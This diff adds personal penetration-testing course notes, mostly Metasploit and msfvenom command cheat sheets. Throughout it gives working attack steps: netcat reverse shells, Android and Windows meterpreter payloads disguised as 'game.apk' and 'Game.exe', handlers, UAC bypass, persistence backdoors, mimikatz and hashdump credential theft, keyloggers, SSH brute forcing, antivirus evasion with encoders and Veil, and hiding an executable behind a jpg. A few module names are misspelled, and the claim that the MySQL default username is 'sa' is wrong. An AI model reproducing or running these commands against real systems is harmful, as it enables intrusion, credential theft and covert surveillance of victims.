@@ -1,0 +1,763 @@
+#Metasploit:
+We can also test for the vulnerability using different nmap and metasploit scripts
+Netcat listening port					//nc -lp 1234
+Reverse shell							//nc -e /bin/bash 192.168.10.11 1234
+
+#How bad guys make reverse shells--
+Interactive shell cheat sheet				http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+php webshells								https://github.com/JohnTroony/php-webshells	(popular c99 shell)
+
+
+#Techniques when working with Metasploit:
+Port scanning
+Vulnerability scanning
+
+
+#Privelege escalation:
+use exploit/windows/local/ask
+
+#Persistence:
+run persistence -X							//meterpreter 
+
+
+#Basic metasploit terms:
+>"Bind" payload is used to open the port on the target's computer and then attacker connects to it whereas 
+>"reverse" payload is used to connect to the attacker machine from the target's computer and thus bypassing the firewall
+
+
+#Hacking android---
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.2 LPORT=4444 -o /root/Desktop/game.apk
+Send the payload on the globe
+
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp					//android payload
+set LHOST 192.168.10.2
+set LPORT 4444
+exploit -j -z	
+
+(In metaspolit we can use "hide_app_icon " in the meterpreter session while hacking android and it will hide the app from the apps.But he can still uninstall it so we need to use app persistence strategy)
+
+
+
+
+#Metasploit Basic Commands:
+uictl 													//helps in disabling and enabling keyboards
+
+wmic 													//read
+
+use post/windows/gather/enum_ms_product_keys			//helps to retrieve product key
+
+use post/windows/gather/enum_dirperms					//gather directory permissions
+
+use post/windows/gather/usb_history						//gather usb history
+
+use post/windows/gather/enum_applications				//list of installed applications
+
+use post/windows/gather/dumplinks						//gathers the information of the linked files
+
+ftp [ip address]										//helps to connect to ftp server
+
+use auxiliary/scanner/ftp/anonymous						//helps to know the version of ftp 
+
+use auxiliary/scanner/ssh/ssh_version					//lets you know the version of ssh
+
+use auxiliary/scanner/telnet/telnet_version				//lets you know the version of telnet
+
+use auxiliary/scanner/smtp/smtp_version					//lets you know the smtp version
+
+sysinfo													//tells about the hacked system information
+
+run post/linux/gather/hashdump							//gathers the hashdump(linux)
+
+run post/windows/gather/hashdump						//gathers the hashdump(windows)
+
+idletime												//shows the idle time of the hacked user
+
+exit													//to exit the shell interaction
+
+background												//it puts the session in the background	
+
+screenshot												//lets you take the screenshot of the users window
+
+ipconfig												//ip address of the interface
+
+keyscan_start 											//starts the keylogger
+
+keyscan_dump											//dumps the words that were typed while the keylogger was running
+
+shutdown												//lets you shutdown the computer
+
+migrate													//it migrates the process to another process. It can be done for any of 
+														the reasons like using system process, to hide behind the system process
+														
+run														//executing a meterpreter script or post module
+
+ps														//shows all the process running on the victim's computer
+
+getpid													//returns the process id of the connection 
+
+getuid													//current user at the system
+
+migrate [pid]											//it migrates our process to the process running on system
+
+rev2self												//whenever we use "getsystem" it escalates our priveleges, we can then 
+														use "rev2self" to get back the previous priveleges
+
+
+
+
+
+
+#Password Cracking using Metasploit:
+Password hashes can be dumped when you are the system level user and these are the NTLM hashes
+Password can also be cracked using "mimikatz" tool using metasploit
+when we got the meterpreter shell then we can use ---
+load mimikatz									//this initializes the mimikatz
+msv												//load the passwords we retrieved
+kerberos										//crack the windows hashed passwords
+mimikatz_command -f samdump::hashes				//dump all the hashed passwords
+mimikatz_command -f sekurlsa::searchPasswords	//Decrypts the hashed passwords
+
+>Pass the hashes directly:-
+We can provide the hashes directly to the other credentials as it does not need the original plain text then
+exploit/windows/smb/psexec						//it helps to put the hashes directly
+
+>run hashdump									//provides the hash file of passwords of the users
+
+
+
+
+#Starting of Metasploit: 
+>service postgresql start
+>meterpreter
+>exploit multi/handler
+
+>db_status					//check whether the database is connected to the metaploit or not
+msfvenom is the combination of msfpayload and msfencoder
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=[listening address] LPORT=[listening port] -e [encoders like x86/shikata_ga_nai] -i 6 -f exe >Desktop/a.exe
+
+
+
+#Metasploit Terms:
+>Payload is the bullet while the exploit is the canon or the gun to help that fire...payload is the infected file(Payload is the portion of malware which performs malicious action) and the 
+>Exploit is the helping feature
+>Encoders help in the encoding the payload 
+>Post is the post exploitation tools and can be used after exploiting the victim
+>Nops is no operation
+
+##Payload types:
+singles						//self contained and standalone			windows/shell_reverse_tcp
+stagers						//setup a network connection b/w attacker and victim 				windows/shell/reverse_tcp_rc4
+stages						//downloaded by stagers modules							//here shell is the stages in the above eg
+
+
+#Nessus:
+Installing Nessus---
+dpkg -i [nessus file]
+service nessusd start					//to start the service and then go to https://127.0.0.1:8834
+service nessusd status					//status of online or offline
+
+The vulnerability we get in the nessus and if they are exploited with metasploit, we can directly search for the vulnerability in the msfconsole
+
+
+
+#Risk with the testing:
+Crashes of applications
+Down of the servers
+Performance lost
+Configuration modifications
+Disclosure of Confidential information
+Forgotton backdoors
+
+
+#Mitigating the risks:
+Exclude legacy services and custom services
+Test critical systems during off hours
+perform pentest in test environments first
+Network bandwidth must be in limit
+Have a clean up plan
+
+
+#Updating the Metasploit Framework:
+apt update;apt install metasploit-framework					//updates the metasploit
+
+
+
+##Hacking the Windows using metasploit:
+service postgresql start
+msfconsole
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=443 -f exe -o /root/Desktop/Game.exe
+
+>>To listen back to the connections<<
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.10.2
+set LPORT 4444
+exploit -j -z 			//lets the exploit run in the background and will open as soon as anyone will execute it 
+sessions -i 1			//interacts with the session 1
+
+
+
+
+#Privelege Escalation:
+use exploit/windows/local/local/bypassuac			//exploit for privelege escalation
+set SESSION 1										//this exploit needs sessions in their options
+set payload windows/meterpreter/reverse_tcp			//setting the same payload to this exploit
+set LHOST 192.168.10.2
+set LPORT 4444
+
+After meterpreter session opened we need to type--
+getsystem -t 1								//getting system privelege using technique 1
+getuid										//gets the user id of the system
+
+
+
+
+
+
+
+
+
+#Persistence:
+run persistence -h 						//set the parameters accordingly
+eg-run persistence -A -P windows/meterpreter/reverse_tcp -X -i 10 -p 5555 -r 192.168.10.2
+
+
+#Removing the backdoor---
+rm "c:\\Desktop\\a.txt"
+reg deleteval -k  "HKLM\\Software\\Microsoft\\Windows\\abc" -v "abcs"
+
+#Removing the logs from the attacker computer--
+cd .msf4/logs/persistence							//changing directory to persistence folder	
+rm CL-XP						
+
+
+#Another method of creating the backdoor persistence:
+We need to create the backdoor using "TheFatRat"
+then we need to have the post module used--
+use post/windows/manage/persistence_exe 
+show options
+set REXEPATH /root/fatrat/abcd.exe 
+set session 1
+set startup SYSTEM
+
+
+
+
+
+
+
+
+
+
+
+
+#Post Exploitation Modules:
+escalates			//bypassuac,getsystem
+gather				//Enum_termsrv,hashdump,smart_hashdump			//helps to gether more information
+Manage				//Enable_RDP,Migrate,smart_migrate				//it changes the configuration of the victim's computer
+
+>In registry, HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Terminal Server Client\			
+it lets you know the system that has connected to it before remotely,We can find it out using meterpreter, run "post/windows/gather/enum_termsrv"
+
+Advanced Post exploitation---
+Meterpreter Extensions(StdApi,Priv,Core)		//they are loaded with meterpreter
+Meterpreter Extensions(Incognito,Sniffer)		//we need to load them using "load incognito"	
+
+
+
+
+#Collecting sensitive data:
+We need to look at sharing folders
+look inside the system in detail 
+Get each and every detail of Web browser(history,extensions,credentials)
+Instant messaging clients(account configuration,chat logs)
+
+Real world example--
+web.config file 							//in the web server and contains configuration
+tnsnames.ora								//details about the database
+Exploit databases---exploit-db,packet storm
+
+
+
+#Other methods for creating the undetectable backdoor:
+>veil-framework					
+>MobaXterm									//read	
+(Encryption is necessary in the veil framework otherwise the defender will get to know about the virus and thus will create an undetectable backdoor)
+
+
+
+
+
+
+#Attacking Mysql server--(Default username for mysql is "sa")
+use auxiliary/scanner/mssql/mssl_ping								//this will find about the mysql
+use auxiliary/scanner/mssql/mssl_login								//this will try to login using password lists
+use auxiliary/admin/mssql/mssl_enum						//get more information about the server databases when we have the username and password
+use auxiliary/admin/mssql/mssl_exec						//this helps to execute commands on the cmd an get more info about the firewall
+>>netsh firewall show state<<					//state of the firewall
+>>netsh firewall set opmode disable<<			//disabling firewall and this will all be set in the CMD option
+
+use exploit/windows/mssql/mssql_payload			//exploit to login into the mssql
+and thus mysql attacked even without attacking windows
+
+
+
+
+
+
+
+
+
+
+7. Gaining access and Exploitation
+ 
+**Metasploit Framework**
+Terms like:-
+* Vulnerability
+* Payload
+* Exploit
+* Shells -- Reverse Shell(type of shell where the target machine trying to connect back to Kali Machine, target machine connects to our port), Bind Shell(target machine opens its port to connect to)
+
+Reverse shell is always better option available. 
+
+
+7.1 Metasploit Framework structure
+cd /usr/share/metasploit-framework
+cd /usr/share/metasploit-framework/modules
+
+7.2 Modules 
+* Auxiliary -- actions like scanning , fuzzing , DOS attacks
+* encoders -- something that helps to evade antivirus detection
+* evasion -- almost same as encoders used to bypass windows defender (almost now encoders and evasion dont work as antivirus are now updated)
+* exploits -- code to get access to vulnerability and helps to run payload
+* nops -- instruction for the processor to do nothing
+* payloads
+* post -- post exploitation
+
+
+Payload types:-
+Singles -- That are completely standalone
+Stagers -- set up a network connection between the attacker and victim
+Stages -- Payload components that are downloaded by stagers modules
+
+
+
+7.3 Metasploit Working
+msfconsole 					//to start metasploit
+show payloads 				// to know about the list of payloads
+use exploit/windows/smb/ms06_040_netapi			//to use the exploit, this is the command
+show info					//information about the particular exploit and what options it needs
+show options				//options that are needed by exploit to execute
+set RHOST 192.168.29.2		//set the options specified
+set payload windows/meterpreter/reverse_tcp			//sets the payload that we want to 
+show targets				//shows all targets that can be exploited using this exploit
+exploit						//at last when all is final, do the exploit thing
+
+
+To search for exploit in metasploit
+search vsftpd
+
+All the compatible payloads
+show payloads 
+
+and then show options
+
+
+
+**Netcat tool helps to establish connection with other machines via UDP or TCP
+nc -h
+nc [ip address] [port no.]
+
+
+
+7.4 Types of Vulnerability
+> Information Disclosure
+> Samba Exploitation (search samba in msfconsole to get different types of payloads, exploits,auxiliary--better for deep scanning)
+use auxiliary/scanner/smb
+>Attacking SSH- Brute Force attack
+search ssh
+use auxiliary/scanner/ssh/ssh_login
+and then can set username and password file
+and set verbose = true (will print out failed username and password as well)
+
+
+**To see all the sessions that have been created in metasploit:-
+sessions			//will give list of sessions
+sessions - i [Id]	//accessing the session using session id
+
+**Accessing ssh using linux
+ssh [username]@[ip]	 and then enter password
+
+**Main things to keep in focus when doing exploitation
+>Get the version name of each service running
+>search using searchsploit
+>search using msfconsole search
+
+>Eternal Blue
+search eternalblue  (different no. of auxiliary and exploits)	(using auxiliary we can check whether host is vulnerable or not)
+use the exploit
+set the payload
+
+>Eternal Blue Double Pulsar attack (exploit not available in metasploit, we will see how to add it)
+**wine is a program that allows to execute windows applications on linux systems
+To install wine--sudo dpkg --add -architecture i386 && apt-get update && apt-get install wine32
+Then git clone [eternal blue double pulsar link]
+Then in that directory, copy 'deps' and 'ruby file' to /usr/share/metasploit-framework/modules/exploits/windows/smb/ -r 	(r for directory)
+Also copy the base folder i.e. eternalblue-double-pulsar to root directory
+
+>Bluekeep Vulnerability 
+search bluekeep
+
+**Show targets -- shows the list of targets that can be exploited
+**set target [id] -- to select the associated target
+
+
+7.5 Routersploit
+Tool to check whether router has any vulnerability or not
+git clone [routersploit tool link github]
+
+
+
+
+
+8. SMBGhost CVE 2020-0796 - Windows 10 Manual Exploitation
+Find from the github
+>crash windows 10 using this vulnerability
+>Remote code execution --- https://github.com/ZecOps/CVE-2020-0796-RCE-POC     (fix offset value)
+
+**To listen for incoming connections
+ncat -lvp 4444
+
+
+
+
+
+9.Gaining Access (Viruses, Trojans, Payloads ...)
+
+9.1 Generate payloads using MsfVenom (msfvenom -h)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=5555 -f exe -o shell.exe
+
+p(payload) f(filetype) o(output name) i(no. of iterations to encode the payload) a(architecture) n(nopsled--no operations)
+
+
+To listen to upcoming action:-
+use exploit/multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp (same as what we defined in msfvenom)
+set LHOST 192.168.1.12
+set LPORT 5555
+
+
+9.2 Advanced MsfVenom Payload
+**To list different file formats-- msfvenom --list formats
+**To list different encoders -- msfvenom --list encoders
+**To list different payloads -- msfvenom --list payloads
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=5555 -a x64 -e x64/zutto-dekiru -i 15 --platform windows -n 500 -f exe -o shell.exe
+
+
+9.3 Veil Framework
+apt-get install veil
+veil
+use 1  (to select any tool)
+list (to list all the payloads)
+generate (generate the payload)
+
+**Convert bat to exe (B2E github)
+**To unzip file 		//unzip [file name]
+
+
+To create handler on metasploit, copy the path that is generated from payload creation of Veil 'Metasploit Resource file'
+In msfconsole:-
+>resource [path]			//It will automatically set the listener
+
+
+
+9.4 TheFatRat
+git clone [fatrat tool]
+cd Fatrat
+fatrat
+and then type numbers accordingly and create a payload
+It automatically does not create listener file, so we can go to msfconsole and select the same payload that we selected at time of payload creation
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.12
+set LPORT 5555
+exploit
+
+
+
+**To change the hexcode of the payload i.e. exe file , hexeditor shell.exe and then only change the hex that has the values as strings
+
+
+9.5 Making our payload look like another file type
+Select the two files (jpg,exe) and right click archive
+>archive format 'zip'
+>select sfx archive
+>Go to advanced, sfx options
+>In new windows, go to setup , jpg name and then next line shell name
+>In modes, unpact to temporary folder and hide all
+>In update, Extract and update files and Overwrite all files
+>In Text and Icon, at last load sfx icon file
+>and then ok
+
+
+
+
+
+
+
+
+10.Post Exploitation - Elevating Privileges, Extracting Data, Running Keyloggers
+>Executing system commands(clearev,execute,ps etc.)
+execute -f calc				//opening calculator at windows
+record_mic -d 10
+
+10.1 Elevating Privileges
+search bypassuac
+or search 2020			//will list all the 2020 modules
+and also exploit/windows/local		//'local' are the exploits that work after the system has got hacked
+
+10.2 Persistence
+bg
+search persistence
+use exploit/windows/local/persistence_service
+show options
+
+10.3 Post Exploitation
+bg
+search post/windows
+use post/windows/gather/checkvm
+show options
+set SESSION 1
+run
+
+or u can directly run post exploitation module from meterpreter session
+run post/windows/gather/enum_applications
+
+
+
+1.Mobile Backdoors
+
+1.1 Create Payload using MsfVenom
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=567
+
+1.2 Use Ngrok for tunnel services (exploit things)
+cd Downloads
+./ngrok authtoken [auth token] 					//we will get from website after signing up
+./ngrok tcp 4242								//starting ngrok tcp port 4242
+
+
+
+
+
+>Gaining access using our own virus
+* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=5555 -f exe -o shell.exe
+* In msfconsole , use explot/multi/handler - to listen to incoming connections
+
+Advanced msfvenom
+* msfvenom --list formats
+* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=5555 -a x64 -e x64/zutto_devkiru -i 10 --platform windows -n 500 -f exe -o shell2.exe
+
+
+
+
+
+
+> Post Exploitation - Elevating Priveleges
+* background the sessions - background
+* File System Commands - upload, download, cat 
+* System commands - execute -f calc (executes calculator) , kill [pid]
+* bypassuac - search bypassuac, local exploits helps to escalate priveleges and they just require the session id, use exploit/windows/local/bypassuac_fodhelper
+*Creating persistence - use exploit/windows/local/persistence_service
+* post exploitation methods - whenever in meterpreter shell, background the session and search for post/windows
+and use it  or directly run in meterpreter shell like run post/windows/gather/hashdump
+*hashdump - use post/windows/gather/hashdump
+
+Note-- starting apache webserver to transfer files - systemctl start apache2
+
+
+
+
+
+
+
+
+
+>Metasploit Framework
+* msfdb init -- initializing the database
+
+* Exploit - This is a piece of code that when executed will exploit the vulnerability of the target
+* Payload - This is a piece of code that runs on the target after successful exploitation. It defines the actions we want to perform on the target system
+* Auxiliary - These are the modules that provide additional functionalities such as scanning, fuzzing, sniffing and much more.
+* Encoders - Encoders are used to obsufcate modules to avoid detection by a protection mechanism such as an ANTIVIRUS or a FIREWALL
+* Meterpreter - It is a payload that uses -in memory DLL injection stagers. It provides a variety of function we can perform on the target.
+
+
+
+
+
+
+
+13. Exploitation Basics--
+1.Reverse Shells vs Bind shells--
+Most common shell is reverse shell. Reverse shell is that the victim connect to attacker.
+It is done using netcat.
+Victim-- nc 192.168.1.1 4444 -e /bin/bash					(victim ip address 192.168.1.2)
+Attacker-- nc -lvp 4444									(attacker ip address 192.168.1.1)
+
+Bind shell--In this, the attacker tries to connect to the victim, and is not used as it can be caught easily.
+Attacker-- nc 192.168.1.2 4444			(attacker ip 192.168.1.1)
+Victim-- nc -lvp 4444 -e /bin/bash		(victim ip 192.168.1.2)
+
+2.Staged vs Non-staged payload--
+Payload--It is run to exploit.
+Staged-Sends payload in stages, can be less stable eg--windows/meterpreter/reverse_tcp
+Non-staged--Sends  exploit shellcode all at once, larger in size and won't always work
+eg-windows/meterpreter_reverse_tcp
+
+3.Gaining root with metasploit--
+searchsploit samba 2.2
+msfconsole
+search trans2open			(SMB type of vulnerability)
+and set the options and "run"/"exploit"
+
+and if the payload is not working, set payload linux/x86/
+set payload/linux/x86/shell_reverse_tcp
+
+
+4.Manual exploitation--OpenFuck tool is therer to exploit
+
+5.Brute Force Attacks--
+hydra -l(login name) root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.10.12:22 -t 4(no. of attempts at once) -V(verbosity)
+
+and this same task can be done using metasploit also-
+search ssh
+use auxiliary/scanner/ssh/ssh_login
+set username root
+set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+set rhosts 192.168.10.12
+
+6.Credential Stuffing--
+Injecting breached account credentials in hopes of account takeover
+For switching off and on the proxy again and again in firefox, we can use FoxyProxy and just use it to turn on or off whenever needed.
+To attack one or more parameter in the Burpsuite->Intruder, we need to use "Pitchfork"
+and then we can start the attack
+
+
+
+
+
+
+
+
+
+
+14. Mid-course capstone--
+Hackthebox.eu				//website which allows different websites to attack and practise
+
+Hacking Legacy(Retired machine)--
+nmap -A -T4 -p- 10.10.10.4 					//-T runs from 1 to 5 (speed)		//-p- (all 65535 ports)
+
+If there is a vulnerability that is of "smb", then we can connect it using "smbclient -L \\\\10.10.10.4\\"
+Now if we get the access, that is good and then we can enumerate it more.
+
+To get the SMB_version, we can go to msfconsole,
+search smb_version
+use auxiliary/scanner/smb/smb_version
+
+use exploit/windows/smb/ms08_067_netapi
+show targets
+run
+
+aftet the machine is hacked, the meterpreter shell is opened, then we can surf try all the commands,
+getuid						//it tells about the server name, if we have NT AUTHORITY\SYSTEM(it is the most powerful as it is the privelege of the system), highest privelege level
+sysinfo						//information of the system
+help						//tells about the commands of the meterpreter
+shell						//command prompt
+
+
+
+
+
+
+
+
+
+
+15.Introduction to Exploit development--
+1.Buffer Overflow--In this the buffer space is filled totally and the characters are filled till what is known as EIP(Extended Instruction Pointer) where we can redirect and control the stack.
+Steps to conduct a buffer overflow--
+1.Spiking--method to find the vulnerable part of the program
+2.Fuzzing--Send a bunch of code so that we can break the system
+3.Finding the offset-After breaking, we must know at what point did we break it
+4.Overwriting the EIP--Replace the offset with the current address
+5.Finding bad characters
+6.Finding the right module
+7.Generating shellcode--We will point EIP to our malicious shellcode
+8.Root!--Then we will gain root access
+
+
+
+*************************************************************************************************************************
+#Extra
+>Try to get access to one and then try to get more access and change to whatever to get what you need
+
+>Whenever we get a statement "Exploit completed, but no session was generated".
+There might be a error of the payloads used because of which no session was created
+One such payload is there, which almost never fails--"cmd/unix/reverse"		(non interactive shell)
+
+Whenver i get a shell, i will see what packages are running--
+dpkg -l										//list all the packages that are installed in the system
+
+>If we can't change the things on the victim then we need to copy it out attacker's machine and then make changes and then using wget download it over victim' machine and then replace it
+
+
+>bad guys don't care about our system.They will do anything they want to get what they want<<
+ufw status						//status of the firewall on the target's machine(windows)
+ufw allow ssh					//this will allow the ssh which was before deny
+
+>MSFC configuration(Metasploit community)-----graphical interface
+>Nexpose------------vulnerability scanner -----generating reports
+
+>Exsploit					//metaspolit easy script
+
+>The Axer(github)				//msfvenom script
+
+>metasploit---windows/smb/eternalblue_doublepulsar						//read
+
+>Note---eternal blue exploit,double puslar exploit					//read 
+
+>We can hook any of the browser using BEEF 
+
+>We can Exploit over the internet (over the WAN) by just enabling the proxies and get the public ip and enabling port forwarding
+
+>nodistribute.com---website used for scanning the file and check whether the file is infected or not..can be used to check the particular payload
+
+>virustotal.com---same work as above but sends the signature to every antivirus
+
+>git clone [the url path]
+
+>venom_master	--it helps in automation of msfvenom creating payload (venom gui model---https://github.com/r00t-3xp10it/venom)
+
+>"locate metasploit" 						//helps to locate the metasploit directories
+
+>etc/shadow								//all the passwords are stored in shadow file
+
+>service apache2 start 							//starts the apache2 service
+
+>shell--user interface that allows to perform actions
+
+>powershell--developed by microsoft for the automation and configuration management.It is based on .net framework and allows scripting
+
+>Mainly we need to check the autorun folder in the windows to see that there might be a backdoor
+"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+>When we have a shell payload then we need to press "Ctrl+Z" to background the session
+
+
+
+
+
